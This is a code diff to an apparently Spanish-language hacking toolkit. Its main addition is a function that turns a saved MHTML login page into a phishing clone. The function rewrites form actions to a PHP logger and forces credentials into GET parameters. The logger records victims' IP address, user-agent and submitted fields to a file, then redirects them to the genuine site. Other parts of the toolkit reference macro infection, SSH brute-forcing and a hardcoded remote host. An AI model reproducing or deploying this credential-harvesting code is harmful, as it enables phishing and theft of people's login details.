@@ -35,6 +35,7 @@ from sys import stdout
 from bs4 import BeautifulSoup
 from tabulate import tabulate
 from hashlib import md5, sha1
+from quopri import decodestring
 from colorama import Fore, init
 from subprocess import getoutput
 from strgen import StringGenerator
@@ -152,9 +153,9 @@ def update():
 def findperson(nombre, arg): # Funciona with
     
     if arg == None:
-        arg = "all"
+        arg = "ALL"
     
-    nombre = f"{nombre} /{arg.upper()}"
+    nombre = f"{nombre} /{arg}"
 
     def limpieza(limp):
 
@@ -1123,8 +1124,8 @@ def wordinfect(ruta, macro):
 
 def sc4pk(idcap, selec):
 
-    selec = selec.lower()
-    CONTADOR=0
+    if selec != None:
+        selec = selec.lower()
 
     ver_carpeta=os.listdir(".")
 
@@ -1187,7 +1188,7 @@ def sc4pk(idcap, selec):
 
     def obtener(idcap):
 
-        global CONTADOR
+        CONTADOR = 0
 
         try:
             obtiene=requests.get("http://192.71.249.244:60001/comments")
@@ -2589,5 +2590,274 @@ def sshforce(ip, port, usr, pssw):
 
         else:
             crint("[ERROR] Datos ingresados no validos ...")
+
+def eashi(dir_):
+
+    # Variables de Instancias
+    buffer = ""
+    action = ""
+    log_2 = False
+    add_my_css = "null"
+    in_dir = os.listdir(".")
+
+    if "server" in in_dir:
+        shutil.rmtree("server")
+    
+    os.makedirs("server")
+    save_dir = sht("./server/")
+    
+    # Varaible de limpieza para formularios
+    not_in_form = ["<", ">", '"']
+
+    # Variable de mejora en HTML
+    emergency = [
+
+        ["<head>", '<head>\n<meta name="viewport" content="width=device-width, initial-scale=1" />\n'], # Adapta webs de escritorio a telefono
+        ['method="post"', 'method="get"'], # METHOD: Reemplazan el post por los get y obtener credenciales
+        ['method="POST"', 'method="GET"'],
+        ["disabled", ""] # Habilita botones bloqueados por seguridad de mhtml
+
+    ]
+
+    # Archivo php para almacenar TARGETS
+    log_php = '''<?php
+    // Archivo donde se guardarán los datos
+    $file = 'logs.txt';
+
+    // Obtener la fecha y hora actual
+    $date = date('Y-m-d H:i:s');
+
+    // Obtener la dirección IP del usuario
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    // Obtener el User-Agent del usuario
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+    // Verifica si hay parámetros en la URL
+    if (!empty($_GET)) {
+        $data = "Fecha: $date | IP: $ip | User-Agent: $user_agent | Parámetros: ";
+        
+        // Recorre cada parámetro y lo añade al string de datos
+        foreach ($_GET as $key => $value) {
+            $data .= "$key=$value, ";
+        }
+        
+        // Guardar en el archivo
+        file_put_contents($file, $data . "\n", FILE_APPEND);
+    }
+
+    // Redirigir a otra página web
+    header("Location: action_");
+    exit();
+    ?>'''
+
+    # Excepciones de css que no tienen que contener el texto
+    css_except = ["Content-Type: ", "Content-Transfer-Encoding: ", "Content-Location: ", "----"]
+
+    # Se obtiene el css de el html, pasado como lista
+    def css_get(name_file):
+
+        # Se lee el archivo igual que en el html
+        with open(name_file, "r", encoding="utf-8", errors="ignore") as code_list:
+
+            # Se verifica si hay codigos en el texto para reemplazar y borrar luego se crea una lista para iterar
+            code_test_pc = code_list.read()
+            if "=\n" in code_test_pc and '=3D"' in code_test_pc:
+                try:
+                    code_list = decodestring(code_test_pc).decode("utf-8", errors="ignore").replace(";", ";\n").split("\n")
+                except:
+                    pass
+
+            # Se inician las variables de control
+            id_css = 0
+            buffer_css = ""
+            get_css = False
+            css_bool = False
+
+            # La lista de css que ira quedando para agregar al html
+            my_css_add_html = []
+
+            for line in code_list:
+                
+                # Si hay un css que esta directamente en html se guarda en True
+                if "Content-Location: " in line and "://" not in line:
+                    get_css = True
+
+                # Se marca donde empezar a guardar el css
+                if '@charset "utf-8";' in line:
+                    css_bool = True
+                
+                # Se guarda cada linea en buffer mientras no tenga ---- y se cumplan ambas condiciones
+                if css_bool == True and get_css == True and all(except_line not in line for except_line in css_except):
+                    buffer_css = buffer_css + "\n" + line
+                
+                # Si llega al final del css se obtiene todo y se guarda en un css correspondiente a su id
+                if "----" in line and css_bool == True and get_css == True:
+
+                    with open(f"{save_dir}css_{id_css}.css", "w", encoding="utf-8") as save_css:
+                        my_css_add_html.append(f"css_{id_css}.css")
+                        save_css.write(buffer_css)
+
+                    id_css += 1
+                    buffer_css = ""
+                    css_bool = False; get_css = False
+        
+        return my_css_add_html if my_css_add_html != [] else "null"
+
+    # Si contiene \ en la direccion
+    if dir_ in in_dir:
+        dir_ = sht("./"+dir_)
+
+    else:
+        dir_ = dir_.replace("\\", "/") if "\\" in dir_ else sht(dir_)
+
+    """
+    # Detector del html
+    with open(dir_, "r", encoding="utf-8", errors="ignore") as native_, open("login.html", "w", encoding="utf-8") as save_:
+        
+        crint(f"[INFO] Verificando css en dominios externos en =>> [{dir_}]")
+        for line in native_:
+            try:
+                # Si hay caracteres validos en la linea se guarda en buffer
+                if '"' in line and any(inclu_html in line for inclu_html in html_include) and all(except_line not in line for except_line in css_except):
+                    buffer = buffer + line
+
+                # Si hay un enlace que termine en .css y en buffer ya se termino de almacenar el html, se guarda el archivo
+                if ".css" in buffer and "</html>" in line:
+                    crint("[PASS] CSS en domio externo encontrado =>> [OK]")
+                    add_my_css = css_get(dir_)
+                    break
+
+                elif ".css" not in buffer and "</html>" in line:
+                    add_my_css = css_get(dir_)
+                    print(line)
+                    break
+
+            except:
+                pass
+    """
+    #########################################
+    #      Detector de HTML en MHTML        #
+    #########################################
+
+    try:
+        with open(dir_, "r", encoding="utf-8", errors="ignore") as native_, open(f"{save_dir}login.html", "w", encoding="utf-8") as save_:
+            
+            all_ = native_.read()
+            
+            # Se limpian los caracteres extras de pc
+            if "=\n" in all_ and '=3D"' in all_: 
+                try:
+                    all_ = decodestring(all_).decode("utf-8", errors="ignore")
+                except:
+                    pass
+
+            all_ = all_.replace(">", ">\n").split("\n")
+
+            crint(f"[INFO] Verificando css en dominios externos en =>> [{dir_}]")
+            for line in all_:
+                try:
+                    
+                    # Si detecta un codigo html empieza a guardar en buffr linea por linea
+                    if "<html" in line:
+                        log_2 = True
+
+                    # Si hay caracteres validos en la linea se guarda en buffer
+                    if log_2 == True:
+                        buffer = buffer + line #+ "\n" # \n ES BETA
+
+                    # Si termina el html se cierra el escaneo
+                    if "</html" in line and log_2 == True:
+                        break
+
+                except:
+                    pass
+            
+            # Se escanea el archivo en busca de css
+            add_my_css = css_get(dir_)
+
+            # Si no hay ningun css externo en buffer ni interno, se termina el programa
+            if ".css" not in buffer and add_my_css == "null":
+                crint("[INFO] No se logro encontrar ningun CSS externo ni interno [BAD]")
+                exit(0)
+
+            # Guarda y modifica el html
+            save_.write(buffer)
+    
+    except FileExistsError:
+        crint(f"[ERROR] El archivo {dir_} no existe ...")
+        exit(0)
+        
+    ########################################
+    #           Bloque de formulario       #
+    ########################################
+
+    # Seccion de modificacion de login.html
+    with open(f"{save_dir}login.html", "r", encoding="utf-8") as modify_:
+        
+        crint(f"[INFO] Modificando formulario en =>> [LOG]")
+        # Se lee y almacena el archivo casi listo en 2 variables. Una sin modificar y la otra en lista
+        modify_100 = modify_.read()
+
+        if "<form" in modify_100:
+
+            # Variable del texto en modo lista limpiada de caracteres
+            modify_1000 = modify_100.replace(">", ">\n").split("\n")
+
+            # Por cada linea del archivo se verifica si hay formulario
+            for line in modify_1000:
+
+                # Si hay formulario se crea una lista con las etiquetas dentro de la linea
+                if "<form" in line:
+                    #chk = True
+                    
+                    # Se reemplazan los caracteres inecesarios
+                    for not_ls in not_in_form:
+                        line = line.replace(not_ls, "")
+                    
+                    # Y se crea una lista
+                    line = line.replace(" ", "=").split("=")
+                    
+                    # Si efectivamente esta la etiqueta action en form, se reemplaza por log.php
+                    if "action" in line:
+
+                        # Variable es la redirect a la web oficial una ves obtenida
+                        action = line[line.index("action")+1]
+                        modify_100 = modify_100.replace(action, "log.php")
+                        
+
+                    # Si no hay action en form se le agrega action hacia log.php
+                    elif "action" not in line:
+                        modify_100 = modify_100.replace("<form", '<form action="log.php" ')
+                        action = "https://www.google.com/"
+                    
+                    # Si no hay metodo en el formulario
+                    if "method" not in line:
+                        modify_100 = modify_100.replace('log.php"', 'log.php" method="get" ')
+
+                    crint(f"[INFO] Enlace de redireccion =>> [{action}]")
+
+                    # Se limpia finalizando todo lo necesario para guardar el archivo
+                    for clean_ in emergency:
+                        modify_100 = modify_100.replace(clean_[0], clean_[1])
+
+                # Una vez obtenido el formulario se guarda el archivo html        
+                if "</form" in line:
+                    with open(f"{save_dir}login.html", "w", encoding="utf-8") as save_, open(f"{save_dir}log.php", "w", encoding="utf-8") as save_php_:
+                        
+                        # Si el resultado de la busqueda interna es diferente de nula, se guarda.
+                        if add_my_css != "null":
+                            for css_code in add_my_css:
+                                modify_100 = modify_100.replace("</head>", f'<link rel="stylesheet" href="{css_code}">\n</head>')
+                        
+                        save_.write(modify_100)
+                        save_php_.write(log_php.replace("action_", action))
+
+                    crint(f"[PASS] Los archivos han sido guardados exitosamente en =>> [{save_dir}]")
+                    break
+        
+        else:
+            crint(f"[ERROR] Formato de pagina correcto, formulario no encontrado ...")
+
 # python3 fsh.py urldump --a <social_network> --b <count> < ------------ in mgt0ls
 #################################
